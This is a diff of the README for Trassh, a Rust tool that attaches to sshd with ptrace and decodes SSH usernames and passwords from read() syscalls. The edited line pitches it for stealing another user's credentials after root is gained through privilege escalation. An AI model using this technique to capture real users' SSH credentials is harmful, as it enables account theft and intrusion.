@@ -5,7 +5,7 @@ Trassh is ssh session sniffer written in rustlang which uses ptrace for sniffing
 Trassh identifies the PID of SSHD and attached. Creating the certain tracer options to detect child_fork() and attached to it. The tracer reads data from CPU registers to determine the syscall being made or not. read() syscalls from fd (6) is used to accept inputs such as username and password. Knowing this we can identify exact syscall handles by user inputs. By this we can decode username and password.
 
 ## Installation and Usage
-Uses the sudo privilege keep that in mind.
+Uses the sudo privilege. If you got root via local privilege escalation? Want his ssh username and password. You may try it..
 ```bash
 :$ git clone https://github.com/0x00snape/Trassh.git
 :$ cd Trassh
